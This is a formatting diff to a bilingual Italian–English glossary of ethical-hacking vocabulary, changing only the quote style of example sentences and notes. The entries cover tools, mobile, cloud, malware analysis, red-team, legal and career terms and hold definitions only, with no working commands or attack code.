               context: 'advanced-tools',
               difficulty: 'advanced',
             },
@@ -6976,7 +6972,7 @@ export default {
               pronunciation: '/ʃɑːrp haʊnd/',
               phonetic: 'SHARP-haund',
               example:
-                'SharpHound collects AD data for BloodHound analysis. = SharpHound raccoglie dati AD per l\'analisi BloodHound.',
+                "SharpHound collects AD data for BloodHound analysis. = SharpHound raccoglie dati AD per l'analisi BloodHound.",
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'SharpHound',
@@ -7061,7 +7057,7 @@ export default {
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'PetitPotam, Coercer',
-              note: 'PetitPotam, PrinterBug, ShadowCoerce: tutti forzano auth NTLM verso l\'attaccante.',
+              note: "PetitPotam, PrinterBug, ShadowCoerce: tutti forzano auth NTLM verso l'attaccante.",
             },
             {
               english: 'NTLM Relay',
@@ -7223,7 +7219,7 @@ export default {
               pronunciation: '/eɪ piː keɪ/',
               phonetic: 'EI-PII-KEI',
               example:
-                'An APK is a ZIP archive containing the Android app. = Un APK è un archivio ZIP che contiene l\'app Android.',
+                "An APK is a ZIP archive containing the Android app. = Un APK è un archivio ZIP che contiene l'app Android.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
               note: 'Android Application Package. Contiene DEX, manifest, risorse, ecc.',
@@ -7365,7 +7361,7 @@ export default {
               pronunciation: '/ˈsɪdiə/',
               phonetic: 'SI-dia',
               example:
-                'Cydia is the alternative app store for jailbroken iOS. = Cydia è l\'app store alternativo per iOS jailbroken.',
+                "Cydia is the alternative app store for jailbroken iOS. = Cydia è l'app store alternativo per iOS jailbroken.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'Cydia, Sileo',
@@ -7405,7 +7401,7 @@ export default {
               context: 'mobile-hacking',
               difficulty: 'advanced',
               tool: 'Frida, Objection',
-              note: 'Difesa contro MITM: l\'app accetta solo i suoi cert. Bypassabile con hook a runtime.',
+              note: "Difesa contro MITM: l'app accetta solo i suoi cert. Bypassabile con hook a runtime.",
             },
             {
               english: 'SSL Pinning Bypass',
@@ -7464,7 +7460,7 @@ export default {
               pronunciation: '/ˈoʊwɒsp ˈmoʊbaɪl tɒp ten/',
               phonetic: 'OU-uosp MOU-bail TOP TEN',
               example:
-                'OWASP Mobile Top 10 lists key mobile security risks. = L\'OWASP Mobile Top 10 elenca i principali rischi di sicurezza mobile.',
+                "OWASP Mobile Top 10 lists key mobile security risks. = L'OWASP Mobile Top 10 elenca i principali rischi di sicurezza mobile.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
             },
@@ -7506,7 +7502,7 @@ export default {
               pronunciation: '/ˈstætɪk əˈnæləsɪs ˈmoʊbaɪl/',
               phonetic: 'STA-tik e-NA-li-sis MOU-bail',
               example:
-                'Static analysis examines the binary without running it. = L\'analisi statica esamina il binario senza eseguirlo.',
+                "Static analysis examines the binary without running it. = L'analisi statica esamina il binario senza eseguirlo.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
             },
@@ -7516,7 +7512,7 @@ export default {
               pronunciation: '/daɪˈnæmɪk əˈnæləsɪs ˈmoʊbaɪl/',
               phonetic: 'dai-NA-mik e-NA-li-sis MOU-bail',
               example:
-                'Dynamic analysis observes the app at runtime. = L\'analisi dinamica osserva l\'app a runtime.',
+                "Dynamic analysis observes the app at runtime. = L'analisi dinamica osserva l'app a runtime.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
             },
@@ -7526,7 +7522,7 @@ export default {
               pronunciation: '/ɪnˈsɪkjʊər ˈstɔːrɪdʒ/',
               phonetic: 'in-SI-kiur STO-rig',
               example:
-                'Insecure storage saves sensitive data unencrypted. = L\'archiviazione insicura salva dati sensibili non cifrati.',
+                "Insecure storage saves sensitive data unencrypted. = L'archiviazione insicura salva dati sensibili non cifrati.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
               note: 'Common: token in SharedPreferences, password in plist, ecc.',
@@ -7558,7 +7554,7 @@ export default {
               pronunciation: '/ˈtæpdʒækɪŋ/',
               phonetic: 'TAP-ge-king',
               example:
-                'Tapjacking overlays UI to trick the user. = Il tapjacking sovrappone UI per ingannare l\'utente.',
+                "Tapjacking overlays UI to trick the user. = Il tapjacking sovrappone UI per ingannare l'utente.",
               context: 'mobile-hacking',
               difficulty: 'advanced',
               note: 'Versione mobile del clickjacking: una app malevola "ruba" i tap.',
@@ -7704,7 +7700,7 @@ export default {
               pronunciation: '/es θriː ˈbʌkɪt ɪˌnjuːməˈreɪʃən/',
               phonetic: 'ES-THRII BA-ket i-niu-me-REI-scen',
               example:
-                'S3 bucket enumeration finds publicly readable storage. = L\'enumerazione bucket S3 trova storage leggibile pubblicamente.',
+                "S3 bucket enumeration finds publicly readable storage. = L'enumerazione bucket S3 trova storage leggibile pubblicamente.",
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'aws cli, s3scanner',
@@ -7872,7 +7868,7 @@ export default {
               pronunciation: '/ˈæʒər ˈstɔːrɪdʒ ɪˌnjuːməˈreɪʃən/',
               phonetic: 'A-zur STO-rig i-niu-me-REI-scen',
               example:
-                'Azure storage enumeration finds public blobs. = L\'enumerazione storage Azure trova blob pubblici.',
+                "Azure storage enumeration finds public blobs. = L'enumerazione storage Azure trova blob pubblici.",
               context: 'cloud-hacking',
               difficulty: 'advanced',
               tool: 'MicroBurst',
@@ -7916,7 +7912,7 @@ export default {
               pronunciation: '/klaʊd ˈfʌŋkʃənz/',
               phonetic: 'KLAUD FANK-scenz',
               example:
-                'Cloud functions can leak environment secrets. = Le cloud function possono rivelare segreti d\'ambiente.',
+                "Cloud functions can leak environment secrets. = Le cloud function possono rivelare segreti d'ambiente.",
               context: 'cloud-hacking',
               difficulty: 'advanced',
             },
@@ -8017,7 +8013,7 @@ export default {
               pronunciation: '/kənˈfjuːzd ˈdepjʊti/',
               phonetic: 'kon-FIUZD DE-piu-ti',
               example:
-                'The confused deputy problem affects cross-account access. = Il problema del deputy confuso colpisce l\'accesso cross-account.',
+                "The confused deputy problem affects cross-account access. = Il problema del deputy confuso colpisce l'accesso cross-account.",
               context: 'cloud-hacking',
               difficulty: 'advanced',
               note: 'Mitigato da ExternalId nelle policy di assume-role.',
@@ -8078,7 +8074,7 @@ export default {
               pronunciation: '/ˈdɒkər ˈsɒkɪt/',
               phonetic: 'DO-ker SO-ket',
               example:
-                'Mounted Docker socket equals root on the host. = Socket Docker montato equivale a root sull\'host.',
+                "Mounted Docker socket equals root on the host. = Socket Docker montato equivale a root sull'host.",
               context: 'cloud-hacking',
               difficulty: 'advanced',
               code: '/var/run/docker.sock',
@@ -8184,7 +8180,7 @@ export default {
               pronunciation: '/ˈstætɪk əˈnæləsɪs/',
               phonetic: 'STA-tik e-NA-li-sis',
               example:
-                'Static analysis examines code without execution. = L\'analisi statica esamina il codice senza esecuzione.',
+                "Static analysis examines code without execution. = L'analisi statica esamina il codice senza esecuzione.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               note: 'Più sicura ma più difficile: il codice può essere offuscato/cifrato.',
@@ -8218,7 +8214,7 @@ export default {
               pronunciation: '/piː iː əˈnæləsɪs/',
               phonetic: 'PII-II e-NA-li-sis',
               example:
-                'PE analysis examines headers, sections, and imports. = L\'analisi PE esamina header, sezioni e import.',
+                "PE analysis examines headers, sections, and imports. = L'analisi PE esamina header, sezioni e import.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'PE-bear, CFF Explorer',
@@ -8229,7 +8225,7 @@ export default {
               pronunciation: '/aɪ eɪ tiː/',
               phonetic: 'AI-EI-TII',
               example:
-                'The IAT lists all DLL functions used by the binary. = L\'IAT elenca tutte le funzioni DLL usate dal binario.',
+                "The IAT lists all DLL functions used by the binary. = L'IAT elenca tutte le funzioni DLL usate dal binario.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               note: 'Import Address Table. Rivela le capabilities del malware (network, crypto, ecc.).',
@@ -8286,7 +8282,7 @@ export default {
               pronunciation: '/diːkəmˈpaɪlər/',
               phonetic: 'dii-kom-PAI-ler',
               example:
-                'Decompilers turn assembly back to pseudo-C code. = I decompilatori riportano l\'assembly a pseudo-codice C.',
+                "Decompilers turn assembly back to pseudo-C code. = I decompilatori riportano l'assembly a pseudo-codice C.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'Ghidra, IDA Hex-Rays',
@@ -8304,7 +8300,7 @@ export default {
               pronunciation: '/daɪˈnæmɪk əˈnæləsɪs/',
               phonetic: 'dai-NA-mik e-NA-li-sis',
               example:
-                'Dynamic analysis runs the malware in a sandbox. = L\'analisi dinamica esegue il malware in una sandbox.',
+                "Dynamic analysis runs the malware in a sandbox. = L'analisi dinamica esegue il malware in una sandbox.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               note: 'Mostra il vero comportamento ma il malware può rilevare la sandbox.',
@@ -8315,7 +8311,7 @@ export default {
               pronunciation: '/ˈsændbɒks/',
               phonetic: 'SAND-boks',
               example:
-                'A sandbox isolates the malware from the host. = Una sandbox isola il malware dall\'host.',
+                "A sandbox isolates the malware from the host. = Una sandbox isola il malware dall'host.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'Cuckoo, Any.Run, Joe Sandbox',
@@ -8370,7 +8366,7 @@ export default {
               pronunciation: '/eɪ piː aɪ ˈhʊkɪŋ/',
               phonetic: 'EI-PII-AI HU-king',
               example:
-                'API hooking intercepts system calls for monitoring. = L\'hooking di API intercetta chiamate di sistema per monitoraggio.',
+                "API hooking intercepts system calls for monitoring. = L'hooking di API intercetta chiamate di sistema per monitoraggio.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'Frida, API Monitor',
@@ -8381,7 +8377,7 @@ export default {
               pronunciation: '/ˈdebʌɡər/',
               phonetic: 'DE-ba-ger',
               example:
-                'A debugger steps through malware execution. = Un debugger fa stepping nell\'esecuzione del malware.',
+                "A debugger steps through malware execution. = Un debugger fa stepping nell'esecuzione del malware.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'x64dbg, OllyDbg, WinDbg',
@@ -8432,11 +8428,11 @@ export default {
               pronunciation: '/ˈɡiːdrə/',
               phonetic: 'GHI-dra',
               example:
-                'Ghidra is the NSA open source reverse engineering tool. = Ghidra è il tool di reverse engineering open source dell\'NSA.',
+                "Ghidra is the NSA open source reverse engineering tool. = Ghidra è il tool di reverse engineering open source dell'NSA.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'Ghidra',
-              note: 'Open-sourced dall\'NSA nel 2019. Decompiler integrato.',
+              note: "Open-sourced dall'NSA nel 2019. Decompiler integrato.",
             },
             {
               english: 'IDA Pro',
@@ -8511,7 +8507,7 @@ export default {
               pronunciation: '/sɪmˈbɒlɪk ˌeksɪˈkjuːʃən/',
               phonetic: 'sim-BO-lik ek-si-KIU-scen',
               example:
-                'Symbolic execution explores all paths in code. = L\'esecuzione simbolica esplora tutti i percorsi nel codice.',
+                "Symbolic execution explores all paths in code. = L'esecuzione simbolica esplora tutti i percorsi nel codice.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'angr, KLEE',
@@ -8522,7 +8518,7 @@ export default {
               pronunciation: '/ˈæŋɡər/',
               phonetic: 'AN-ger',
               example:
-                'angr automates binary analysis with Python. = angr automatizza l\'analisi binaria con Python.',
+                "angr automates binary analysis with Python. = angr automatizza l'analisi binaria con Python.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               tool: 'angr',
@@ -8572,7 +8568,7 @@ export default {
               pronunciation: '/ræt/',
               phonetic: 'RAT',
               example:
-                'A RAT gives the attacker full control of the victim PC. = Un RAT dà all\'attaccante controllo totale del PC vittima.',
+                "A RAT gives the attacker full control of the victim PC. = Un RAT dà all'attaccante controllo totale del PC vittima.",
               context: 'malware-analysis',
               difficulty: 'advanced',
               note: 'Remote Access Trojan. Famiglie: njRAT, DarkComet, Quasar, AsyncRAT.',
@@ -8662,7 +8658,7 @@ export default {
               pronunciation: '/ˈʃelkoʊd ˈraɪtɪŋ/',
               phonetic: 'SHEL-koud RAI-ting',
               example:
-                'Shellcode writing requires assembly knowledge. = La scrittura di shellcode richiede conoscenza dell\'assembly.',
+                "Shellcode writing requires assembly knowledge. = La scrittura di shellcode richiede conoscenza dell'assembly.",
               context: 'exploit-dev',
               difficulty: 'advanced',
               note: 'Skill specialistica: scrivere codice macchina compatto e position-independent.',
@@ -8706,7 +8702,7 @@ export default {
               pronunciation: '/ˌpɒliˈmɔːrfɪk ɪnˈkoʊdɪŋ/',
               phonetic: 'po-li-MOR-fik in-KOU-ding',
               example:
-                'Polymorphic encoding changes payload signature. = L\'encoding polimorfico cambia la firma del payload.',
+                "Polymorphic encoding changes payload signature. = L'encoding polimorfico cambia la firma del payload.",
               context: 'exploit-dev',
               difficulty: 'advanced',
               tool: 'shikata_ga_nai',
@@ -8741,7 +8737,7 @@ export default {
                 'Direct syscalls evade EDR monitoring. = Le syscall dirette evadono il monitoraggio EDR.',
               context: 'exploit-dev',
               difficulty: 'advanced',
-              tool: 'SysWhispers, Hell\'s Gate',
+              tool: "SysWhispers, Hell's Gate",
             },
             {
               english: 'Unicode Shellcode',
@@ -8843,7 +8839,7 @@ export default {
               pronunciation: '/hiːp ˈspreɪɪŋ/',
               phonetic: 'HIIP SPREI-ing',
               example:
-                'Heap spraying fills memory to make exploits reliable. = L\'heap spraying riempie la memoria per rendere gli exploit affidabili.',
+                "Heap spraying fills memory to make exploits reliable. = L'heap spraying riempie la memoria per rendere gli exploit affidabili.",
               context: 'exploit-dev',
               difficulty: 'advanced',
             },
@@ -8864,7 +8860,7 @@ export default {
               pronunciation: '/ˈdʌbəl friː/',
               phonetic: 'DA-bel FRII',
               example:
-                'Double free corrupts the heap allocator. = Il double free corrompe l\'allocatore dell\'heap.',
+                "Double free corrupts the heap allocator. = Il double free corrompe l'allocatore dell'heap.",
               context: 'exploit-dev',
               difficulty: 'advanced',
             },
@@ -9060,7 +9056,7 @@ export default {
               pronunciation: '/smæp/',
               phonetic: 'SMAP',
               example:
-                'SMAP blocks kernel from accessing user memory. = SMAP blocca il kernel dall\'accedere alla memoria user.',
+                "SMAP blocks kernel from accessing user memory. = SMAP blocca il kernel dall'accedere alla memoria user.",
               context: 'exploit-dev',
               difficulty: 'advanced',
             },
@@ -9070,7 +9066,7 @@ export default {
               pronunciation: '/keɪ eɪ es el ɑːr/',
               phonetic: 'KEI-EI-ES-EL-AR',
               example:
-                'KASLR randomizes the kernel base address. = KASLR randomizza l\'indirizzo base del kernel.',
+                "KASLR randomizes the kernel base address. = KASLR randomizza l'indirizzo base del kernel.",
               context: 'exploit-dev',
               difficulty: 'advanced',
             },
@@ -9240,7 +9236,7 @@ export default {
               pronunciation: '/eɪ viː ɪˈveɪʒən/',
               phonetic: 'EI-VII i-VEI-zhen',
               example:
-                'AV evasion bypasses signature detection. = L\'evasione antivirus bypassa il rilevamento per firma.',
+                "AV evasion bypasses signature detection. = L'evasione antivirus bypassa il rilevamento per firma.",
               context: 'red-team',
               difficulty: 'advanced',
               note: 'AV moderni usano signature, heuristics, ML, behavior, sandbox, cloud reputation.',
@@ -9262,7 +9258,7 @@ export default {
               pronunciation: '/ˈproʊses ɪnˈdʒekʃən/',
               phonetic: 'PRO-ses in-GIEK-scen',
               example:
-                'Process injection runs code in another process. = L\'iniezione di processo esegue codice in un altro processo.',
+                "Process injection runs code in another process. = L'iniezione di processo esegue codice in un altro processo.",
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'CreateRemoteThread, NtMapViewOfSection',
@@ -9273,7 +9269,7 @@ export default {
               pronunciation: '/ˈproʊses ˈhɒloʊɪŋ/',
               phonetic: 'PRO-ses HO-lou-ing',
               example:
-                'Process hollowing replaces a legitimate process image. = Process hollowing rimpiazza l\'immagine di un processo legittimo.',
+                "Process hollowing replaces a legitimate process image. = Process hollowing rimpiazza l'immagine di un processo legittimo.",
               context: 'red-team',
               difficulty: 'advanced',
             },
@@ -9326,7 +9322,7 @@ export default {
               pronunciation: '/ʌnˈhʊkɪŋ/',
               phonetic: 'an-HU-king',
               example:
-                'Unhooking restores original ntdll.dll bytes. = L\'unhooking ripristina i byte originali di ntdll.dll.',
+                "Unhooking restores original ntdll.dll bytes. = L'unhooking ripristina i byte originali di ntdll.dll.",
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'PE-sieve',
@@ -9337,7 +9333,7 @@ export default {
               pronunciation: '/ˈsændbɒks ɪˈveɪʒən/',
               phonetic: 'SAND-boks i-VEI-zhen',
               example:
-                'Sandbox evasion checks for analysis environments. = L\'evasione sandbox controlla ambienti di analisi.',
+                "Sandbox evasion checks for analysis environments. = L'evasione sandbox controlla ambienti di analisi.",
               context: 'red-team',
               difficulty: 'advanced',
               note: 'Tecniche: timing, mouse movement check, process names, registry keys.',
@@ -9398,7 +9394,7 @@ export default {
               pronunciation: '/lɒl bæs/',
               phonetic: 'LOL-BAS',
               example:
-                'LOLBAS catalogs Windows binaries useful for offense. = LOLBAS cataloga binari Windows utili per l\'offesa.',
+                "LOLBAS catalogs Windows binaries useful for offense. = LOLBAS cataloga binari Windows utili per l'offesa.",
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'lolbas-project.github.io',
@@ -9409,7 +9405,7 @@ export default {
               pronunciation: '/dʒiː tiː ef oʊ bɪnz/',
               phonetic: 'GII-TII-EF-OU-BINZ',
               example:
-                'GTFOBins is the Linux equivalent of LOLBAS. = GTFOBins è l\'equivalente Linux di LOLBAS.',
+                "GTFOBins is the Linux equivalent of LOLBAS. = GTFOBins è l'equivalente Linux di LOLBAS.",
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'gtfobins.github.io',
@@ -9442,7 +9438,7 @@ export default {
               pronunciation: '/ˈænti fəˈrenzɪks/',
               phonetic: 'AN-ti fo-REN-ziks',
               example:
-                'Anti-forensics complicates incident investigation. = L\'anti-forensics complica le indagini degli incidenti.',
+                "Anti-forensics complicates incident investigation. = L'anti-forensics complica le indagini degli incidenti.",
               context: 'red-team',
               difficulty: 'advanced',
             },
@@ -9452,7 +9448,7 @@ export default {
               pronunciation: '/ˌɒpəˈreɪʃənəl kənˈteɪnər/',
               phonetic: 'op-pe-REI-scen-el kon-TEI-ner',
               example:
-                'Operational containers isolate red team infrastructure. = I container operativi isolano l\'infrastruttura red team.',
+                "Operational containers isolate red team infrastructure. = I container operativi isolano l'infrastruttura red team.",
               context: 'red-team',
               difficulty: 'advanced',
             },
@@ -9479,7 +9475,7 @@ export default {
               pronunciation: '/θret ˌemjʊˈleɪʃən/',
               phonetic: 'THRET e-miu-LEI-scen',
               example:
-                'Threat emulation tests defenses against specific TTPs. = L\'emulazione di minacce testa le difese contro TTP specifiche.',
+                "Threat emulation tests defenses against specific TTPs. = L'emulazione di minacce testa le difese contro TTP specifiche.",
               context: 'red-team',
               difficulty: 'advanced',
               tool: 'CALDERA, Atomic Red Team',
@@ -9555,7 +9551,7 @@ export default {
               pronunciation: '/ɪˈnɪʃəl ˈækses/',
               phonetic: 'i-NI-scel AK-ses',
               example:
-                'Initial access is the first step of any red team operation. = L\'accesso iniziale è il primo passo di ogni operazione red team.',
+                "Initial access is the first step of any red team operation. = L'accesso iniziale è il primo passo di ogni operazione red team.",
               context: 'red-team',
               difficulty: 'advanced',
               note: 'Tactic in MITRE ATT&CK. Phishing, exploit pubblici, valid accounts.',
@@ -9625,7 +9621,7 @@ export default {
               pronunciation: '/ˌmeθəˈdɒlədʒi ˈsekʃən/',
               phonetic: 'me-to-DO-lo-gi SEK-scen',
               example:
-                'The methodology section explains the testing approach. = La sezione metodologia spiega l\'approccio di test.',
+                "The methodology section explains the testing approach. = La sezione metodologia spiega l'approccio di test.",
               context: 'reporting',
               difficulty: 'advanced',
             },
@@ -9733,7 +9729,7 @@ export default {
               pronunciation: '/ˈɪmpækt/',
               phonetic: 'IM-pakt',
               example:
-                'Impact translates technical risk into business risk. = L\'impatto traduce il rischio tecnico in rischio di business.',
+                "Impact translates technical risk into business risk. = L'impatto traduce il rischio tecnico in rischio di business.",
               context: 'reporting',
               difficulty: 'advanced',
             },
@@ -9997,7 +9993,7 @@ export default {
               pronunciation: '/ˈskriːnʃɒt/',
               phonetic: 'SKRIIN-shot',
               example:
-                'Quality screenshots prove the vulnerability exists. = Screenshot di qualità dimostrano l\'esistenza della vulnerabilità.',
+                "Quality screenshots prove the vulnerability exists. = Screenshot di qualità dimostrano l'esistenza della vulnerabilità.",
               context: 'reporting',
               difficulty: 'advanced',
               tool: 'Flameshot, Greenshot',
@@ -10038,7 +10034,7 @@ export default {
         {
           id: 'ethack_legal_1',
           title: 'Leggi e Regolamenti / Laws & Regulations',
-          description: 'Quadro legale dell\'hacking etico',
+          description: "Quadro legale dell'hacking etico",
           items: [
             {
               english: 'Computer Fraud and Abuse Act',
@@ -10060,7 +10056,7 @@ export default {
                 'GDPR requires reporting breaches within 72 hours. = Il GDPR richiede segnalazione di breach entro 72 ore.',
               context: 'legal',
               difficulty: 'advanced',
-              note: 'General Data Protection Regulation. Vigente nell\'UE dal 2018.',
+              note: "General Data Protection Regulation. Vigente nell'UE dal 2018.",
             },
             {
               english: 'Convenzione di Budapest',
@@ -10120,7 +10116,7 @@ export default {
               pronunciation: '/ɪˈtæliən ˈsaɪbər lɔː/',
               phonetic: 'i-TA-li-en SAI-ber LO',
               example:
-                'Article 615 ter punishes unauthorized computer access in Italy. = L\'articolo 615 ter punisce l\'accesso abusivo a sistemi informatici in Italia.',
+                "Article 615 ter punishes unauthorized computer access in Italy. = L'articolo 615 ter punisce l'accesso abusivo a sistemi informatici in Italia.",
               context: 'legal',
               difficulty: 'advanced',
               note: 'Codice Penale italiano: punisce con reclusione fino a 3 anni.',
@@ -10158,7 +10154,7 @@ export default {
               pronunciation: '/ˈmɑːstər ˈsɜːrvɪs əˈɡriːmənt/',
               phonetic: 'MAS-ter SER-vis a-GRII-ment',
               example:
-                'The MSA defines the overall business relationship. = L\'MSA definisce il rapporto commerciale complessivo.',
+                "The MSA defines the overall business relationship. = L'MSA definisce il rapporto commerciale complessivo.",
               context: 'legal',
               difficulty: 'advanced',
               note: 'Abbreviato MSA. Cornice generale: poi ogni progetto ha un suo SoW.',
@@ -10190,7 +10186,7 @@ export default {
               pronunciation: '/en diː eɪ/',
               phonetic: 'EN-DII-EI',
               example:
-                'NDAs protect confidential information shared during the engagement. = Gli NDA proteggono informazioni riservate condivise durante l\'incarico.',
+                "NDAs protect confidential information shared during the engagement. = Gli NDA proteggono informazioni riservate condivise durante l'incarico.",
               context: 'legal',
               difficulty: 'advanced',
               note: 'Non-Disclosure Agreement. Spesso bidirezionale: protegge entrambe le parti.',
@@ -10222,7 +10218,7 @@ export default {
               pronunciation: '/ɪnˌdemnɪfɪˈkeɪʃən/',
               phonetic: 'in-dem-ni-fi-KEI-scen',
               example:
-                'Indemnification protects against third party claims. = L\'indennizzo protegge da reclami di terze parti.',
+                "Indemnification protects against third party claims. = L'indennizzo protegge da reclami di terze parti.",
               context: 'legal',
               difficulty: 'advanced',
             },
@@ -10232,7 +10228,7 @@ export default {
               pronunciation: '/ɪnˈʃʊərəns/',
               phonetic: 'in-SHU-rens',
               example:
-                'Professional liability insurance is essential for pentesters. = L\'assicurazione di responsabilità professionale è essenziale per i pentester.',
+                "Professional liability insurance is essential for pentesters. = L'assicurazione di responsabilità professionale è essenziale per i pentester.",
               context: 'legal',
               difficulty: 'advanced',
               note: 'Errors and Omissions (E&O) insurance: copre errori che causano danni al cliente.',
@@ -10364,7 +10360,7 @@ export default {
               pronunciation: '/aʊt ɒv skoʊp/',
               phonetic: 'AUT ov SKOUP',
               example:
-                'Out of scope reports may even result in account ban. = Segnalazioni fuori scope possono addirittura causare ban dell\'account.',
+                "Out of scope reports may even result in account ban. = Segnalazioni fuori scope possono addirittura causare ban dell'account.",
               context: 'legal',
               difficulty: 'advanced',
             },
@@ -10392,7 +10388,7 @@ export default {
               pronunciation: '/ˈprɪvəsi baɪ dɪˈzaɪn/',
               phonetic: 'PRI-ve-si BAI di-ZAIN',
               example:
-                'Privacy by design embeds protection from the start. = Privacy by design integra la protezione fin dall\'inizio.',
+                "Privacy by design embeds protection from the start. = Privacy by design integra la protezione fin dall'inizio.",
               context: 'legal',
               difficulty: 'advanced',
               note: 'Principio cardine del GDPR: la privacy non è un add-on.',
@@ -10471,11 +10467,11 @@ export default {
             },
             {
               english: 'Export Control',
-              italian: 'Controllo dell\'esportazione',
+              italian: "Controllo dell'esportazione",
               pronunciation: '/ˈekspɔːrt kənˈtroʊl/',
               phonetic: 'EKS-port kon-TROUL',
               example:
-                'Some exploit tools are subject to export control. = Alcuni tool di exploit sono soggetti a controllo dell\'esportazione.',
+                "Some exploit tools are subject to export control. = Alcuni tool di exploit sono soggetti a controllo dell'esportazione.",
               context: 'legal',
               difficulty: 'advanced',
             },
@@ -10601,7 +10597,7 @@ export default {
                 'Write-ups document how a CTF challenge was solved. = I write-up documentano come è stata risolta una sfida CTF.',
               context: 'ctf-labs',
               difficulty: 'advanced',
-              note: 'Pubblicare write-up costruisce reputazione e rinforza l\'apprendimento.',
+              note: "Pubblicare write-up costruisce reputazione e rinforza l'apprendimento.",
             },
           ],
         },
@@ -10639,8 +10635,7 @@ export default {
               italian: 'OffSec Proving Grounds',
               pronunciation: '/ɒf sek pruːvɪŋ ɡraʊndz/',
               phonetic: 'OF-SEK PRU-ving GRAUNDZ',
-              example:
-                'OffSec PG prepares you for OSCP. = OffSec PG ti prepara per l\'OSCP.',
+              example: "OffSec PG prepares you for OSCP. = OffSec PG ti prepara per l'OSCP.",
               context: 'ctf-labs',
               difficulty: 'advanced',
               tool: 'portal.offsec.com',
@@ -10750,7 +10745,7 @@ export default {
               pronunciation: '/ɪp sek/',
               phonetic: 'IP-SEK',
               example:
-                'IppSec\'s videos walk through every retired HTB box. = I video di IppSec guidano in ogni box HTB ritirata.',
+                "IppSec's videos walk through every retired HTB box. = I video di IppSec guidano in ogni box HTB ritirata.",
               context: 'ctf-labs',
               difficulty: 'advanced',
               tool: 'youtube.com/c/ippsec',
@@ -10795,7 +10790,7 @@ export default {
               pronunciation: '/ɪˌnjuːməˈreɪʃən ˌmeθəˈdɒlədʒi/',
               phonetic: 'i-niu-me-REI-scen me-to-DO-lo-gi',
               example:
-                'Solid enumeration methodology beats raw skill. = Una metodologia di enumerazione solida batte l\'abilità grezza.',
+                "Solid enumeration methodology beats raw skill. = Una metodologia di enumerazione solida batte l'abilità grezza.",
               context: 'ctf-labs',
               difficulty: 'advanced',
               note: '"Enumerate harder!" - mantra del corso PWK/OSCP.',
@@ -10817,7 +10812,7 @@ export default {
               pronunciation: '/hɪnts/',
               phonetic: 'HINTZ',
               example:
-                'Use hints sparingly to maximize learning. = Usa i suggerimenti con parsimonia per massimizzare l\'apprendimento.',
+                "Use hints sparingly to maximize learning. = Usa i suggerimenti con parsimonia per massimizzare l'apprendimento.",
               context: 'ctf-labs',
               difficulty: 'advanced',
             },
@@ -10909,7 +10904,7 @@ export default {
               pronunciation: '/ˈpærət oʊ es/',
               phonetic: 'PA-ret OU-ES',
               example:
-                'Parrot OS is a privacy-focused alternative to Kali. = Parrot OS è un\'alternativa a Kali focalizzata sulla privacy.',
+                "Parrot OS is a privacy-focused alternative to Kali. = Parrot OS è un'alternativa a Kali focalizzata sulla privacy.",
               context: 'ctf-labs',
               difficulty: 'advanced',
               tool: 'parrotsec.org',
@@ -10992,7 +10987,7 @@ export default {
               pronunciation: '/siː iː eɪtʃ/',
               phonetic: 'SII-II-EICH',
               example:
-                'CEH covers the breadth of ethical hacking topics. = CEH copre l\'ampiezza degli argomenti di hacking etico.',
+                "CEH covers the breadth of ethical hacking topics. = CEH copre l'ampiezza degli argomenti di hacking etico.",
               context: 'career',
               difficulty: 'advanced',
               note: 'EC-Council. Più teorica di OSCP. Riconosciuta da DoD per posizioni 8570.',
@@ -11117,8 +11112,7 @@ export default {
               italian: 'OSCE3 (triple Offensive Security)',
               pronunciation: '/oʊ es siː iː θriː/',
               phonetic: 'OU-ES-SII-II-THRII',
-              example:
-                'OSCE3 combines OSEP, OSWE, and OSED. = OSCE3 combina OSEP, OSWE e OSED.',
+              example: 'OSCE3 combines OSEP, OSWE, and OSED. = OSCE3 combina OSEP, OSWE e OSED.',
               context: 'career',
               difficulty: 'advanced',
               note: 'Certificazione "metà": chi ottiene tutte e tre riceve il titolo OSCE3.',
@@ -11260,7 +11254,7 @@ export default {
               pronunciation: '/bʌɡ ˈbaʊnti ˈhʌntər/',
               phonetic: 'BAG BAUN-ti HAN-ter',
               example:
-                'Top bug bounty hunters earn six figures yearly. = I migliori bug bounty hunter guadagnano sei cifre l\'anno.',
+                "Top bug bounty hunters earn six figures yearly. = I migliori bug bounty hunter guadagnano sei cifre l'anno.",
               context: 'career',
               difficulty: 'advanced',
               note: 'Pochi top guadagnano $1M+, molti altri lo fanno solo part-time.',
@@ -11342,7 +11336,7 @@ export default {
               pronunciation: '/ˈskoʊpɪŋ kɔːl/',
               phonetic: 'SKOU-ping KOL',
               example:
-                'Scoping calls determine engagement details with the client. = Le call di scoping determinano i dettagli dell\'ingaggio col cliente.',
+                "Scoping calls determine engagement details with the client. = Le call di scoping determinano i dettagli dell'ingaggio col cliente.",
               context: 'career',
               difficulty: 'advanced',
             },
@@ -11415,7 +11409,7 @@ export default {
               pronunciation: '/kənˈtɪnjuəs ˈlɜːrnɪŋ/',
               phonetic: 'kon-TI-niu-es LER-ning',
               example:
-                'Continuous learning is non-negotiable in this field. = L\'apprendimento continuo è non negoziabile in questo campo.',
+                "Continuous learning is non-negotiable in this field. = L'apprendimento continuo è non negoziabile in questo campo.",
               context: 'career',
               difficulty: 'advanced',
